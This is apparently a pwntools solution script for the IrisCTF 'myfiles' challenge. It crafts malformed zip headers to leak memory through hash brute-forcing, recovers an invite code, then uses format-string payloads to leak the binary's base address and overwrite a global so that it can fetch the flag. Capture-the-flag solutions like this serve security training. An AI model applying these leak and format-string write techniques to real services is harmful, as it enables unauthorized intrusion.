from pwn import *
import string 

elf = ELF("./chal", checksec=False)
context.log_level = 'debug'
context.binary = elf
p = remote("myfiles.chal.irisc.tf", 10001)

def hash(bs):
    h = 0xcbf29ce484222325
    for i in range(len(bs)):
        h = (h ^ bs[i]) * 0x100000001b3
        h = h & 0xffffffffffffffff
    return h

def list_files(id):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"? ", str(id).encode())

def create_user(user, code):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"? ", code)
    p.sendlineafter(b"? ", user[0])
    p.sendlineafter(b"? ", user[1])

def upload_file(user, f):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"? ", user[2])
    p.sendlineafter(b"The zip file must only contain one uncompressed file\n", f)

def view_file(user, id):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"? ", user[2])
    p.sendlineafter(b"? ", user[1])
    p.sendlineafter(b"? ", str(id).encode())

def get_flag(user):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"? ", user[2])
    p.sendlineafter(b"? ", user[1])

def gen_head(name_len, file_len):
    return (b"504b0304".ljust(0x12 * 2, b"0") + p32(file_len).hex().encode()).ljust(0x1a * 2, b"0") + p32(name_len).hex().encode() + b"0" * 0x20

def gen_file(l1, c):
    return gen_head(l1, len(c))[:2 * (l1 + 0x1e)] + c.hex().encode()

def leak(offset, size):
    for i in range(size):
        upload_file((0, 0, b"15"), gen_head(0xffffffff - offset - i - i * 0x202, 0xb))
    list_files(15)
    p.recvline()
    start = b"tecode.txt"
    res = b""
    for i in range(size):
        val = int(p.recvlineS(False).split(' ')[-1], 16)
        for b in string.printable:
            tmp = (start + res + b.encode())[-11:]
            if val == hash(tmp):
                res += b.encode()
                break
    return res 

user0 = (b"user", b"1", b"0") # name, pass, idx
code = leak(0x1ff, 19 + 1) # b"yelling-pixel-corals"
create_user(user0, code)
f = gen_file(0, b"%8$p" + b" " * 0x20)
upload_file(user0, f)
view_file(user0, 0)
elf.address = addr = int(p.recvlineS(False).split(' ')[0], 16) - 0x5040 
info(hex(addr))
f = gen_file(0, fmtstr_payload(14, {elf.sym['fileUsers'] + 0x10: 1}) + b" " * 0x20)
upload_file(user0, f)
view_file(user0, 1)
get_flag(user0)
p.interactive()
